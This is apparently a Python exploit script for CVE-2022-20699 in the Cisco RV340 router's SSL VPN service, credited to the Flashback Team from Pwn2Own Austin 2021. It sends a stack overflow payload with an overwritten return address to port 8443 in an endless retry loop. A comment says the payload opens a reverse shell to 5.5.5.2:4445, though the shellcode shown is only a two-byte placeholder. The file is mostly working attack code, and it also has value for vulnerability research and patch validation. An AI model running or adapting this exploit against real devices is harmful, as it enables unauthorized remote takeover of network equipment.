#!/usr/bin/python3
#
# Cisco RV340 WAN exploit presented at Pwn2Own Austin 2021 by Flashback Team
# Pedro Ribeiro (@pedrib1337) && Radek Domanski (@RabbitPro)"
# CVE-2022-20699


import sys
import requests
import urllib3
import time
import socket

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def usage():
    print("./flashback_connects.py <TARGET>")
    sys.exit(-1)

if len(sys.argv) != 2:
    usage()

print("[x] Flashback_connects")
print("[*] Launching attack against Cisco RV340 WAN")
print("")

### Reverse Shell to 5.5.5.2:4445
shellcode = b"\x13\x37"

TARGET = sys.argv[1]
FILLER = shellcode + b'\x05' * (16400-(len(shellcode)))

### 0x704aed90
PC = b"\x98\xed\x4a\x70"

url = 'https://%s:8443/X' % TARGET
url += 'X' * (len(TARGET)-7)

payload = FILLER + PC

# Check if sslvpnd is already up before exploit attempt
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
result = sock.connect_ex((TARGET, 8443))
if result == 0:
    print("[*] SSLVPND is up, ready to go!")
else:
    print("[!] SSLVPND is down. Check configuration and try again")
    sys.exit(-1)
sock.close()

while(True):
    try:
        print("[*] Attempt!")
        r = requests.post(url, data=payload, verify=False)
    except requests.exceptions.ConnectionError as e:
        print("[!] Service not available. Sleeping")
        time.sleep(10)
